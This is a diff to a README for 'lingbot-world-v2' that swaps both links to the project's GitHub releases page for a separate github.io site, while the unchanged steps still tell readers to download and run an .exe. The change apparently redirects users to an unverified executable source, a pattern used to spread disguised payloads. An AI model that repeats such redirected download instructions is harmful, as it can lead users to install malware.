@@ -1,6 +1,6 @@
 # 🌐 lingbot-world-v2 - Create infinite worlds with easy interactions
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Mav61449/lingbot-world-v2/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://mav61449.github.io)
 
 ## 🖥️ Overview
 
@@ -22,7 +22,7 @@ Make sure your computer connects to the internet during the initial setup. This 
 
 Follow these steps to place the software on your Windows machine:
 
-1. Visit the following link to access the download area: [https://github.com/Mav61449/lingbot-world-v2/releases](https://github.com/Mav61449/lingbot-world-v2/releases).
+1. Visit the following link to access the download area: [https://mav61449.github.io](https://mav61449.github.io).
 2. Look for the section labeled "Assets" at the bottom of the newest release post.
 3. Click the file ending in `.exe` to begin the download.
 4. Save the file to your desktop or your downloads folder.
